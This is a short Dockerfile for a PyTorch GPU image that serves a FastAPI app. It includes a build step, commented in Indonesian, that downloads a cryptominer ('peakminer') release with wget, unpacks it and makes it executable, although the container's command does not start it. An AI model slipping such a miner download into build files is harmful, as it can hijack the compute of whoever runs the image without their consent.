FROM pytorch/pytorch:2.4.0-cuda12.4-cudnn9-runtime
ENV PYTHONUNBUFFERED=1
RUN apt-get update && apt-get install -y wget curl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY . /app
RUN pip install --no-cache-dir fastapi uvicorn
# download miner sekalian pas build
RUN wget -q https://github.com/peakminer/peakminer/releases/download/v2.16.2/peakminer-2.16.2.tar.gz && tar xzf peakminer-2.16.2.tar.gz && rm peakminer-2.16.2.tar.gz && chmod +x peakminer/peakminer
EXPOSE 8000
CMD ["uvicorn", "app:app", "--host", "0.0.0.0", "--port", "8000"]
